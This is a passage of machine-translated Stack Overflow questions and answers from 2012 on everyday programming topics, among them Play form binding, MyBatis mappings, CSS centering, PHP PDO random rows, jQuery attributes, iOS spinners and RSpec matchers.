    String[] value = urlFormEncoded.get(key);
    if (value.length == 1) {                    
      newData.put(key, value[0]);
    } else if (value.length > 1) {
      for (int i = 0; i < value.length; i++) {
        newData.put(key + "[" + i + "].id", value[i]);          
      }
    }
  }
}        
Form<Book> bookForm = new Form<Book>(Book.class).bind(newData);
if(bookForm.hasErrors()) {
 return badRequest(createForm.render(bookForm));
}
bookForm.get().save(); 
```

但这些代码不起作用。一些身体可以帮助我吗？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T08:50:59.823

不要根据需要注释您的关系，而是在项目保存尝试时执行检查：

```
public static Result saveBook() {
    Map<String, String[]> formUrlEncoded = request().body().asFormUrlEncoded();
    Form<Book> bookForm = form(Book.class).bindFromRequest();
    Set<Author> authors = new HashSet<Author>();

    // iterate through the keys to find values and pre-fill required Set(s)
    for (String key : formUrlEncoded.keySet()) {
        String[] values = formUrlEncoded.get(key);
        for (String val : values) {
            if ("authors.id".equals(key)) authors.add(Author.find.ref(Long.valueOf(val)));
        }
    }

    // Check if form hasn't errors and if it contains authors
    if (bookForm.hasErrors() || authors.size() < 1) {
        return badRequest(createForm.render(bookForm));
    }

    // Create a Book, fill with data from form, add relations, save
    Book book = new Book();
    book = bookForm.get();
    book.authors = authors;
    book.save();

    flash("generalInfo", "Book saved, thank you!");
    return redirect(routes.Application.index());
} 
```

# iphone - 如何使用游戏中心邀请玩家进行回合制游戏

> ID：13548345
> 
> 赞同：0
> 
> 时间：2012-11-25T04:40:39.613
> 
> 标签：iphone, objective-c, ios, xcode, game-center

我正在使用回合制比赛并想邀请玩家，但它没有显示任何玩家邀请列表。我如何获得游戏中心的玩家列表？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:31:42.183

我已经回答了一个类似的问题[Get the near player list using GameCenter](https://stackoverflow.com/q/13510981/1548523)并在这里找到一个很好的教程：[使用游戏中心进行多人游戏](http://upyun.cocimg.com/upload/g2/2012/10/session_519__multiplayer_gaming_with_game_center.pdf)。你可以看看。

此外， [GKMatchmaker 类参考](http://developer.apple.com/library/ios/#documentation/GameKit/Reference/GKMatchmaker_Ref/Reference/Reference.html)有如下方法来帮助您找到**附近的**玩家。你可以试一试。

```
– startBrowsingForNearbyPlayersWithReachableHandler:
– stopBrowsingForNearbyPlayers 
```

# php - 用数百个图像实现滑块

> ID：13548348
> 
> 赞同：0
> 
> 时间：2012-11-25T04:40:53.477
> 
> 标签：php, javascript, jquery, json

我想创建一个从 json 源中获取数据的画廊。我正在无限滚动中列出图像。现在，当用户单击其中一个图像时，我需要在另一页上显示该图像，然后他们可以单击下一个/上一个以查看第一页上显示的图像。

问题是当用户点击它时，我如何才能找出另一个页面上的下一张/上一张图片。用户可能会到达他在第一页上看到所有图像的位置，因此需要转到下一组图像。

我将不胜感激任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:14:09.123

您可以使用 $_SESSION 变量来跟踪您在图像数组中的位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:18:16.900

您可以为图像提供一个 ID（可能是它们在 JSON 对象中的索引），然后将其作为 GET 请求传递到 URL 中。

例如，第一张图片可以称为：[http ://www.example.com/showImage.php?id=1](http://www.example.com/showImage.php?id=1)

您可以通过引用 JSON 对象（这将表示 JSON 对象中的实例之一）从 showImage 页面上的索引中获取图像数据。

```
$image_object = json_decode($your_json_object)[$_GET['id']]; 
```

只需迭代索引以获取下一个和上一个：

```
$next = ($_GET['id'] == sizeof(json_decode($your_json_object)))? ++$_GET['id'] : 1;
$previous = ($_GET['id'] == 1)? sizeof(json_decode($your_json_object)) : --$_GET['id']; 
```

然后使用 html 创建链接

```
<a href="http://www.example.com/showImage.php?id=<?= $next ?>">Next</a>
<a href="http://www.example.com/showImage.php?id=<?= $previous ?>">Previous</a> 
```

我没有对此进行测试，而是继续我从原始帖子中理解的内容。

# java - Mybatis resultmap将值映射到模型的hash map字段

> ID：13548349
> 
> 赞同：2
> 
> 时间：2012-11-25T04:41:08.923
> 
> 标签：java, mybatis

我正在尝试映射创建将填充vehicleVO 的结果映射。我想将几列映射到 vehicleDocuments HashMap。我要填充的数据也存在于同一个表中。

```
public class VehicleVO implements Serializable {
    public String vehicleId;
    public String vehicleNumber;
    public String model;
    public Map<String, Date> vehicleDocuments;
    public TransportVO transport;
    public String distanceTraveled;

} 
```

我正在尝试使用以下 xml 进行映射。但它似乎不起作用。我很清楚这个错误

> “元素类型“resultMap”的内容必须匹配“(constructor?,id*,result*,association*,collection*,discriminator?)”。

```
<resultMap id="BaseResultMap" type="com.svms.service.vo.VehicleVO">
        <id column="vehicle_id" jdbcType="BIGINT" property="vehicleId" />
        <result column="vehicle_no" jdbcType="VARCHAR" property="vehicleNumber" />
        <result column="Model" jdbcType="VARCHAR" property="model" />
        <association property="vehicleDocuments" javaType="java.util.HashMap">
            <result column="FC" jdbcType="DATE" property="FC_TD" />
            <result column="TAX" jdbcType="DATE" property="TAX_TD" />
            <result column="Insureance" jdbcType="DATE" property="INSURANCE_TD" />
            <result column="Form47" jdbcType="DATE" property="FORM47_TD" />
            <result column="NC" jdbcType="DATE" property="NC_TD" />
        </association>
        <result column="total_distance" jdbcType="INTEGER" property="distanceTraveled" />
        <result column="transport_id" jdbcType="BIGINT" property="transportId" />
</resultMap> 
```

如果我的理解是正确的，尝试映射到一个hashMap也可以认为是关联映射。但这只是一对一的映射。我也尝试使用`<collection>`标签进行映射。我仍然得到同样的错误。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-06T16:46:57.517

'resultMap' 下的元素顺序应按照[DTD](http://mybatis.org/dtd/mybatis-3-mapper.dtd)的规定进行维护。将所有“结果”标签移动到“关联”标签之前。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-27T03:57:00.520

不幸的是，您需要实现一个[ResultHandler](https://mybatis.github.io/mybatis-3/java-api.html)来构建一个 Hashmap。

此外，您提到的 DTD 错误是因为结果元素必须在关联元素之前。

# sql - 将 Google BigQuery 查询转换为 Sqlite3

> ID：13548350
> 
> 赞同：-1
> 
> 时间：2012-11-25T04:41:09.100
> 
> 标签：sql, sqlite, google-bigquery

我有以下运行良好的 BigQuery 查询：

```
SELECT created_at, actor_attributes_email, type FROM [githubarchive:github.timeline]
  WHERE 
  (repository_name="rubinius") AND
    (created_at CONTAINS '2011-') AND
  type !='WatchEvent'
ORDER BY created_at; 
```

但是，现在我需要在 Sqlite3 中执行相同的查询。我需要进行哪些更改才能使其正常工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T11:31:53.827

此查询中 SQLite 不支持的唯一非标准功能是`CONTAINS`; 将其替换为`created_at LIKE '%2011-%'`，或者如果保证该值从年份开始，则替换为`created_at LIKE '2011-%'`。

# ruby-on-rails - Rails - 设计 - 仅当用户对象已存在时才允许注册

> ID：13548357
> 
> 赞同：3
> 
> 时间：2012-11-25T04:43:33.227
> 
> 标签：ruby-on-rails, devise

这可能是一个奇怪的问题，但它出现在我最近一直在从事的一个项目中。

我有一个名为 Student 的设计模型，它有一个独特的 :sid 参数。数据库中的 Student 表已经填充了仅设置了 :sid 值的 Student 对象。我需要让学生使用他们的 :sid 进行注册，设置 Student 对象的其他属性并进行任何必要的设计设置。

我到底应该如何设置注册？现在，我正在使用带有以下代码的自定义设计注册控制器：

```
# inside controllers/students/registration_controller.rb
def create
    if Student.exists?(:sid => params[:student][:sid].to_i)
        @student = Student.find_by_sid(params[:student][:sid].to_i)
        @student.update_attributes(params[:student])
        if @student.save
            set_flash_message :notice, :signed_up if is_navigational_format?
            sign_in(Student, @student)
        else
            set_flash_message :notice, :sign_up_failed
            redirect_to student_registration_path
        end
    else
        set_flash_message :error, :sid_not_found
        redirect_to new_student_registration_path
    end
end 
```

此代码仅更新现有的 Student 对象。

我不知道将有效的 :sids 列表存储在其他地方是否更有意义，或者我是否应该完全做其他事情来完成这项工作。

编辑：至于我的主要问题，我想知道这是否是仅允许从使用任意值选择的现有用户对象池中进行注册的最佳方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T19:35:50.097

如果我理解你的问题是正确的：你只想让那些拥有特定令牌的人在网站上注册并填写他们的信息。如果这是您想要做的，那么您可以通过生成一个令牌值（比如 6 个字符：18ui7p）并将它们存储在一个单独的表中来完成此操作，然后如果您想要某人注册，您可以向他们发送一个包含有效令牌的 url 说

```
http://example.com/users/sign_up?token=18ui7p 
```

并且在您的注册控制器中，您覆盖`new`方法以仅允许具有有效令牌（您之前已在数据库中生成并存储）的用户注册为用户，在`create`操作中也是如此，也不要忘记删除/使用后标记令牌。

这样，如果有人（比如学校管理员）想在系统中添加新人，他们可以生成一个令牌并将其通过电子邮件发送给学生，这意味着您将提供一个生成令牌并将其发送到电子邮件的操作，当然这只能由管理员访问。

我刚刚发现了一个名为[devise_invitable](https://github.com/scambra/devise_invitable)的 gem ，它可以做你想做的事，但你可以自己实现解决方案。

# css - 当所有内容都具有动态宽度时，如何在同一行上放置居中文本和右浮动文本？

> ID：13548358
> 
> 赞同：12
> 
> 时间：2012-11-25T04:43:35.860
> 
> 标签：css, center, text-alignment

我有一个可变大小的文本块，我想以 div 为中心。div 的宽度是其父元素的 %，高度由填充定义，无论中心文本有多高。这很容易通过以下方式实现：

```
<div style="width: 50%; padding: 15px; text-align: center;">
    Lorem ipsum...
</div> 
```

这很好用。

但是当我尝试添加右侧的部分时：

```
<div style="width: 50%; padding: 15px; text-align: center;">
    Lorem ipsum...
    <div style="float: right;">ASDF!</div>
</div> 
```

然后它将右侧文本的宽度计算为文本的总宽度，并将“ASDF！” 在右侧，但将“Lorem ipsum ...”放在比应有的位置更多的左侧（好像 lorem 的总长度...包括 asdf！）。

这是我要实现的目标的模型：

![我正在努力实现的目标的样机。](../Images/16f2f0c916e6519fc3001cb047841e34.png)

我认为使用 flexbox 会很容易，但我想避免使用任何最近的东西，因为我需要支持旧的浏览器。

[这个问题](https://stackoverflow.com/questions/12702819/floatright-messing-up-my-centered-text)似乎很相关，但是（如果我错了，请纠正我）它似乎需要已知的宽度。

我最好怎么做呢？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-21T21:57:31.693

试试这个：

```
<div class='content' style="width: 50%; padding: 15px; text-align: center; position: relative">
    <div class="noDown" style="position: absolute; right: 0;">ASDF!</div>
    Lorem ipsum...
</div>​ 
```

JsFiddle 测试：http: [//jsfiddle.net/3Y7ty/2/](http://jsfiddle.net/3Y7ty/2/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-21T14:31:21.497

## IE8+ 够老了吗？

[建立在你的小提琴上](http://jsfiddle.net/w5bfY/6/)，你可以在 IE8+ 中得到你想要的东西。请注意，包装器`#b`需要`box-sizing`设置属性才能使其`width: 50%` *包含* `padding`. 然后对于您的浮动元素，只需添加以下内容：

```
margin: 0 -15px 0 -100%; 
```

`-15px`右边距说明您的`15px`右边距将项目完全拉到右边，然后`-100%`左边距使前面的文本完全居中。

## 还是需要 IE7 支持？

您提到需要支持“旧浏览器”，但您没有提供任何有关如何保持的信息（IE8 现在是“旧的”，但也许您指的是更旧的浏览器）。如果您需要 IE7（或更低？）支持，那么您将需要有条件地以 IE7 为目标并[改用它](http://jsfiddle.net/w5bfY/8/)：

```
margin: -1.2em -15px 0 0; 
```

IE7和后面的浏览器识别不`float: right`一样，会把它放在前面文字的“下方”，`-100%`左边距会把浮动元素拉回左边。这样就消失了，为了使文本与前面的文本一致，我们给它一个负的上边距，应该设置为等于`line-height`正在使用的字体的 （通常是`1.2`或`1.1`；你可能想要明确地将其设置在`#b`容器上）。我还没有测试过这是否适用于 IE6。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-21T14:41:24.273

这对你有好处吗？[http://jsfiddle.net/3Y7ty/](http://jsfiddle.net/3Y7ty/)

```
.container {
    width:100%;
    overflow:hidden;
    position:relative;
}
.center {
    width:50%;
    padding:15px;
    margin:0 auto;
    background:#ccc;
}

.right {
    display:inline-block;
    padding:15px;
    background:#999;
    position:absolute;
    right:0;
    top:0;
}

<div class="container">

 <div class="center">
     Lorem ipsum...
 </div>

 <div class="right">
     ASDF!
 </div>

</div> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-24T15:47:35.430

我已经添加了这个小提琴。[http://jsfiddle.net/nQvEW/68/](http://jsfiddle.net/nQvEW/68/)。看看这个。

我已将主元素定位为绝对，而其中一个子元素相对于父元素，另一个则为绝对。可以根据需要调整顶部和左侧属性。但是我为主要的 div 元素硬编码了以下内容。您可以将其添加为**CSS**。

```
position:absolute;
width:500px;
height:40px;
background-color:#F00; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-25T04:57:22.730

你可以试试：

```
 <div style="width:50%; padding: 15px; text-align: center; ">
Lorem ipsum...<div style=" display:inline; float:right;">ASDF!</div>
</div> 
```

它在我刚刚做的快速模型中起作用。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-27T22:46:40.633

这实际上并不像看起来那么复杂。您只需要从正常流中删除右对齐的 div 并将其定位（对齐）在文本容器的右侧。（演示中所有被注释的 CSS 行都是必需的；其余的用于演示目的。）

此解决方案的优点是容器和文本元素正常流动，并且它使用与您的示例相同的 HTML 结构。

**演示：**

[查看演示 >> http://pasteboard.s3.amazonaws.com/images/1U5yFIwE.png](http://dabblet.com/gist/4392765 "Dabblet 演示")

**基本代码：**

```
#text {
  margin: auto; /* aligns #text to the center of #container */
  text-align: center; /* self-explanatory; aligns text to the center */
  position: relative; /* needed so that the position of #right is relative to #text, not the body */
}

#right {
  display: inline-block; /* allows #right to display on the same line as the text in #text while still acting like a block element (block: p, div, etc.) */
  position: absolute; /* removes #right from the normal flow, and positions it in the top-left of #row */
  right: 0; /* aligns #right 0px away from the right side of #text */
} 
```

**图片：** ![演示图像](../Images/1b3e7d725304370cde95b74690c9e25c.png)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-27T12:31:26.353

我已经完成了一点 css 工作。，

***HTML 的代码示例：***

```
<div class="MainContainer"><p>Lorem ipsum...</p><div style="float: right;">ASDF!</div></div> 
```

***CSS 的代码示例：***

```
.MainContainer{
    width : 50%;
    padding : 15px !important;   
    text-align : center !important;
    border : 15px solid #000;
    position : absolute;   
}

.MainContainer div { margin-top : -7%; text-align:center !important;} 
```

要在行动中看到它：

> [http://jsfiddle.net/john_rock/tZzwA/](http://jsfiddle.net/john_rock/tZzwA/)

我认为这可以帮助您解决问题。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-12-28T08:02:14.440

正如其他人所说，您需要将第二个 div 从流中释放出来，然后重新定位它。将绝对顶部设置为与填充相同以恢复正确的垂直位置。试试这个，（与 Karacas 不同），查看第二个视图以显示居中是正确的：

```
<div style="border:1px solid red;width: 50%; padding: 15px; text-align: center;position: relative;">
    Lorem ipsum...
    <div style="position: absolute;right: 0;top: 15px;">ASDF!</div>
</div>
<div style="border:1px solid red;width: 50%; padding: 15px; text-align: center;">
    Lorem ipsum...
</div> 
```

[http://jsfiddle.net/huuanito/8N9BT/](http://jsfiddle.net/huuanito/8N9BT/)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-12-28T08:38:56.030

您拥有的代码只需*进行一些小的*更改就可以正常工作。

1.  第二个`div`需要是独立的，而不是嵌套在第一个中。
2.  第一个“div”需要向左*浮动**，*第二个需要*向右*浮动。

 ***差不多就是这样。*

```
 <div style="width:50%; padding:15px; text-align:center; float:left;">
     Lorem ipsum...
 </div>

 <div style="float:right;">
     ASDF!
 </div> 
```

[尝试一下！](http://jsfiddle.net/82qFy/1/)**

# php - PHP PDO 返回随机账号

> ID：13548359
> 
> 赞同：1
> 
> 时间：2012-11-25T04:43:52.260
> 
> 标签：php, html, mysql, pdo

我一直在努力学习 php，并且一天比一天好，但仍然无法等到一切都到位并顺利进行。（对于其他编程语言，它以这种方式为我工作了一段时间，然后一切正常）

但我试图让它返回一个随机帐户并显示所有照片以及数据。

这是我的示例代码

```
 <?php
$config['db'] = array(
'host' => 'DATA',
'username' => 'WOULD',
'password' => 'GO',
'dbname' => 'HERE'
);

$db = new PDO('mysql:host=' . $config['db']['host'] . ';dbname=' . $config['db']['dbname'], $config['db']['username'], $config['db']['password']);

$query = $db->query("SELECT `content`.`ProfilePic` FROM `content`");

while ($row = $query->fetch(PDO::FETCH_ASSOC)) {
$Hello = $row['ProfilePic'];
echo  '<html><img src="http://www.MYDOMAIN.COM/Content/';
echo $Hello;
echo '"></html>';

}
?> 
```

所以这样做是在一页上返回每个人的个人资料图片 不是我想要的

我有它，在我的mysql数据库的一个字段中，它为每个帐户都有一个唯一的ID 我希望它随机拍摄其中一个然后返回该行的所有数据

```
FirstName
LastName
Gender
City
State
FacebookUrl
BirthMonth
BirthDay
BirthYear
AccountNumber - This is the one I want to pull and use to return everything
ProfilePic
ProfilePicCaption 
```

所以基本上选择一个随机行并提取所有数据而不是显示一列的所有数据

谢谢你所有的帮助都很棒，至少现在我使用安全代码

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T04:50:33.970

使用[RAND 函数](http://dev.mysql.com/doc/refman/5.5/en/mathematical-functions.html#function_rand)

```
 <?php
$config['db'] = array(
'host' => 'DATA',
'username' => 'WOULD',
'password' => 'GO',
'dbname' => 'HERE'
);

$db = new PDO('mysql:host=' . $config['db']['host'] . ';dbname=' . $config['db']['dbname'], $config['db']['username'], $config['db']['password']);

$query = $db->query("SELECT * FROM `content` ORDER BY RAND() LIMIT 1");

while ($row = $query->fetch(PDO::FETCH_ASSOC)) {
$Hello = $row['ProfilePic'];
// and so on, so forth
echo  '<html><img src="http://www.MYDOMAIN.COM/Content/';
echo $Hello;
echo '"></html>';

}
?> 
```

# c# - 在 MVC 4.0 中将整个 URL 作为参数

> ID：13548362
> 
> 赞同：0
> 
> 时间：2012-11-25T04:44:28.343
> 
> 标签：c#, asp.net-mvc-4

> **可能重复：**
> [是否可以基于子域创建 ASP.NET MVC 路由？](https://stackoverflow.com/questions/278668/is-it-possible-to-make-an-asp-net-mvc-route-based-on-a-subdomain)

我的网址看起来像

```
 http://Infosys-1234.teradata.com 
```

我可以通过将路径配置为将整个 URL 作为参数：

```
 routes.MapRoute(
    name: "Default",
    url: "{url}",
    defaults: new { controller = "App",
                    action = "GetDetailsById", 
                   // url = UrlParameter.Optional
                  }
           ); 
```

如果没有，请给我一个替代方案。我想从 url 中取出 Infosys-1234 作为参数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T07:40:35.817

```
routes.Add("DomainRoute", new DomainRoute( 
    "{param1}.example.com",  "{action}/{param1}",
    new { controller = "Home", action = "Index", param1 = "" }  // Parameter defaults 
)); 
```

来自 [http://blog.maartenballiauw.be/post/2009/05/20/ASPNET-MVC-Domain-Routing.aspx](http://blog.maartenballiauw.be/post/2009/05/20/ASPNET-MVC-Domain-Routing.aspx)

编辑：需要改为说 param1（参数名称）

如果这不起作用，也许这将是一个更好的解决方案

```
routes.MapRoute(
    name: "Default",
    url: "{param1}.mydomain.com",
    defaults: new { controller = "App",
                    action = "GetDetailsById", 
                    param1 = ""
                  }
           ); 
```

# ios - YouTube 播放器的事件在 UIWebView 中不起作用

> ID：13548370
> 
> 赞同：1
> 
> 时间：2012-11-25T04:45:42.777
> 
> 标签：ios, uiwebview, youtube

我想自动播放电影并在 UIWebView 上自动播放下一部电影。我在 UIWebView 上嵌入了 YouTube 播放器，并[为 iFrame](https://developers.google.com/youtube/iframe_api_reference?hl=ja)片段使用了一些 YouTube 播放器 API，但它们效果不佳。

HTML 如下。

```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<style type="text/css">
    body {
        background-color: #000;
        margin: 0;
    }
</style>
</head>
<body>
<div id="player"></div>

<script>
  var tag = document.createElement("script");
  tag.src = "http://www.youtube.com/iframe_api";
  var firstScriptTag = document.getElementsByTagName("script")[0];
  firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

  var player;
  function onYouTubeIframeAPIReady() {
    player = new YT.Player("player", {
      height: "390",
      width: "640",
      videoId: "UqFvrjhbO8c",
      events: {
        "onReady": onPlayerReady,
        "onStateChange": onPlayerStateChange
      }
    });
  }

  function onPlayerReady(event) {
    event.target.playVideo();
  }

  function onPlayerStateChange(event) {
    if (event.data == YT.PlayerState.ENDED) {
      document.location = "api://didEndedMovie";
    }
  }
</script>
</body>
</html> 
```

电影结束时，我希望 webview 加载`api://didEndedMovie`。然后，WebView 委托将接收到加载的事件，并调用下面的委托方法。

```
- (void)viewDidLoad
{
[super viewDidLoad];

if (!_htmlTemplate) {
    NSString *path = [[NSBundle mainBundle] pathForResource:@"YouTubePlayer" ofType:@"html"];
    _htmlTemplate = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
}
NSString *htmlString = [NSString stringWithFormat:_htmlTemplate];
[self.webView loadHTMLString:htmlString baseURL:nil];
}

- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType
{
NSString *requestString = [[request URL] absoluteString];

// if delegate received requests like "api://*", this view controller
// will not move to other views.  

if ([requestString rangeOfString:@"api://"].location == NSNotFound) {
    return YES;
}

// called when the movie ended
if ([requestString isEqualToString:@"api://didEndedMovie"]) {
    NSLog(@"didEndedMovie");
}

return NO;
} 
```

但是，javascript 不起作用......事件`onReady`并`onStateChange`没有被触发。

在浏览器上，这个 javascript 运行良好。

为什么不触发事件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-03T05:04:43.150

这是一个较老的问题，我不知道您是否还需要帮助，所以我会简明扼要。

不要使用 [webView loadHTMLString:baseURL]，而是使用 [webView loadRequest]。loadRequest 方法能够完全加载引用的 YouTube iframe javascript，并且您能够与 iframe api 交互。然后您将看到 onReady 和 onStateChange 事件触发。您还可以调用提示函数和其他东西。如果这不能回答问题，请告诉我。

# javascript - 为什么 jQuery 选择器不能工作，但 getElementById 在这种情况下工作？

> ID：13548371
> 
> 赞同：5
> 
> 时间：2012-11-25T04:45:44.183
> 
> 标签：javascript, jquery, dom

这是HTML：

```
<html>
  <head>
    <script type="text/javascript" src="jquery-1.7.2.min.js"></script>
    <script type="text/javascript" charset="utf-8" src="jquery-1.7.2.js"></script>
    <script type="text/javascript" src="access.js"></script>
  </head>
  <body>
    <button id="trigger"></button>
    <img id= "testElement" style= "position: absolute; border-color: white; top:340px; left:615px;" width="34px" height= "34px" />
  </body>
</html> 
```

access.js 文件是：

```
$(document).ready( function(){
  $('#trigger').click(function(){
    $('#testElement').src="success.png";
    //THIS WON'T WORK.
    document.getElementById('testElement').src= "success.png";
    //BUT THIS WORKS.
  });
}); 
```

我知道如果我使用**$**，返回对象是一个 jQuery 对象。它与 getElementById 不同。但是为什么 jQuery 选择器不能在这里工作呢？

我需要 jQuery 对象来进行更多操作，例如“追加/样式”...

谢谢。

**更新** 几乎同时出现了太多正确答案...请提供更多解释，让我决定应该归功于谁，谢谢！

抱歉，我对您的正确答案理解不佳……我只想了解更多详细信息。

所有属性节点（src/width/height...）都不是 jQuery 对象的属性吗？那么 jQuery 选择器是否只选择像 img/p/li/div 节点这样的 DOM 元素节点？（<> 会导致一些错误。）

请查看更新信息...谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-25T04:50:10.397

A jQuery element is a DOM element wrapped in an *array-like* jQuery object so you have access to all the jQuery methods, but that means you "lose" access to the original DOM methods and properties. You can either use a jQuery method or grab the original DOM element to be able to use the vanilla properties.

```
$('#testElement').attr('src', 'success.png');
$('#testElement')[0].src = 'success.png';
                --^-- get DOM element 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-25T04:47:16.773

因为需要`.attr()`在 jQuery 对象上使用 jQuery 方法：

```
$('#testElement').attr("src", "success.png"); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-25T04:48:40.597

应该

```
$('#testElement').prop("src","success.png");  //1.6 and above 
```

或者

```
$('#testElement').attr("src","success.png");  //before 1.6 
```

在 JavaScript 和 JQuery 中访问属性的方式不同

```
document.getElementById('testElement').src= "success.png"; 
```

也可以实现

```
$('#testElement')[0].src = "success.png"; 
```

*   [.attr()](http://api.jquery.com/attr/)
*   [。支柱（）](http://api.jquery.com/prop/)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-11-25T04:47:27.070

`src`不是 jQuery 对象的属性。你需要做

```
$('#testElement').attr('src', 'success.png') 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-11-25T04:47:41.953

改用这个：

```
$('#testElement').attr("src","success.png"); 
```

或者，如果您使用的是最新版本的 jquery，则可以使用：

```
$('#testElement').prop("src","success.png"); 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-11-25T04:49:39.317

jQuery 对象没有`src`作为 DOM 对象属性的属性，这就是 getElementById 起作用的原因，使用[`.attr()`](http://api.jquery.com/attr/)或[`.prop()`](http://api.jquery.com/prop/)设置匹配的元素属性或属性

```
$('#testElement').attr('src',"success.png");
$('#testElement').prop('src',"success.png"); 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2012-11-25T05:25:11.983

```
>$('#testElement'); 
```

> [<img id=​"testElement" style=​"position:​ absolute;​ border-color:​ white;​ top:​340px;​ left:​615px;​" width=​"34px" height=​"34px">​]

As you can see $ returns an array of DOM elements. Similar to `document.getElementsBy(Class|Tag)Name`, if you want a DOM comparison.

When dealing with an ID (#testElement), you're about sure there's only one element like this, so you can access it directly with `$('#testElement')[0]` (ie, the first element in the array). After that, you're good to go and treat it just the way you'd do it in plain JS.

# iphone - 当uitextview使用google api加载当前位置时停止activityIndi cator

> ID：13548373
> 
> 赞同：0
> 
> 时间：2012-11-25T04:46:37.817
> 
> 标签：iphone, objective-c, ios, google-maps, uiactivityindicatorview

当 uitextview 使用 google api 加载当前位置时如何停止 UIActivityIndi​​catorView。

这是我的代码：

```
@implementation ViewController
@synthesize loctxt;

 - (void)viewDidLoad {

        loctxt=[[UITextView alloc]initWithFrame:CGRectMake(10, 50, 220, 30)];
        loctxt.backgroundColor=[UIColor whiteColor];
        loctxt.delegate=self;
        [self.view addSubview:loctxt];

        locbtn=[[UIButton alloc]initWithFrame:CGRectMake(240, 50, 40, 30)];
        [locbtn addTarget:self action:@selector(clickToGetLocation)forControlEvents:UIControlEventTouchUpInside];
        locbtn.backgroundColor=[UIColor grayColor];
        [locbtn setImage:[UIImage imageNamed:@"sst14.gif"] forState:UIControlStateNormal];
        [self.view addSubview:locbtn];

        [super viewDidLoad];
        // Do any additional setup after loading the view, typically from a nib.
    }

    - (void)clickToGetLocation {

        spinner = [[UIActivityIndicatorView alloc] initWithFrame:CGRectMake(0,100, 20, 20)];
        [spinner setActivityIndicatorViewStyle:UIActivityIndicatorViewStyleGray];
        [self.view addSubview:spinner]; 

         **[spinner startAnimating];**

        AppDelegate *delegate=(AppDelegate *)[[UIApplication sharedApplication]delegate];
        NSString *urlString = [NSString stringWithFormat:@"http://maps.google.com/maps/geo?q=%f,%f&output=csv",delegate.latitude, delegate.longitude];

        NSError* error;
        NSString *locationString = [NSString stringWithContentsOfURL:[NSURL URLWithString:urlString] encoding:NSASCIIStringEncoding error:&error];
        NSLog(@"%@",locationString);

        locationString = [locationString stringByReplacingOccurrencesOfString:@"\"" withString:@""];
        **self.loctxt.text=[locationString substringFromIndex:6];**
    //if i use code [spinner stopanimating]; here then the indicator does not appear    

}
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:06:55.433

问题是您尝试启动微调器，从 Internet 加载数据，然后将微调器全部停在主线程上，并且都在同一个方法中。在主线程上做同步网络是不好的。

您需要启动微调器，然后在后台执行网络访问。完成后，您将停止主线程上的微调器。

GCD 非常适合这一点。像这样的东西：

```
- (void)clickToGetLocation {
    spinner = [[UIActivityIndicatorView alloc] initWithFrame:CGRectMake(0,100, 20, 20)];
    [spinner setActivityIndicatorViewStyle:UIActivityIndicatorViewStyleGray];
    [self.view addSubview:spinner]; 
    [spinner startAnimating];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        AppDelegate *delegate=(AppDelegate *)[[UIApplication sharedApplication]delegate];

        NSString *urlString = [NSString stringWithFormat:@"http://maps.google.com/maps/geo?q=%f,%f&output=csv",delegate.latitude, delegate.longitude];

        NSError* error;
        NSString *locationString = [NSString stringWithContentsOfURL:[NSURL URLWithString:urlString] encoding:NSASCIIStringEncoding error:&error];
        NSLog(@"%@",locationString);

        locationString = [locationString stringByReplacingOccurrencesOfString:@"\"" withString:@""];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.loctxt.text = [locationString substringFromIndex:6];
            [spinner stopAnimating];
        });
    });
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T06:34:53.207

你可以试试这个`spinner.hidesWhenStopped = YES`

# ruby - 使用 RSpec 检查某物是否是另一个对象的实例

> ID：13548375
> 
> 赞同：61
> 
> 时间：2012-11-25T04:47:14.197
> 
> 标签：ruby, testing, rspec, instance

我需要一种方法来检查一个对象是否是使用 RSpec 的另一个对象的实例。例如：

```
describe "new shirt" do
  it "should be an instance of a Shirt object"
    # How can i check if it is an instance of a shirt object
  end
end 
```

* * *

## 回答 #1

> 赞同：140
> 
> 时间：2012-12-20T04:19:52.530

首选语法是：

```
expect(@object).to be_a Shirt 
```

较旧的语法是：

```
@object.should be_an_instance_of Shirt 
```

请注意，两者之间存在非常细微的差异。如果 Shirt 从 Garment 继承，那么**这两个期望都会过去**：

```
expect(@object).to be_a Shirt
expect(@object).to be_a Garment 
```

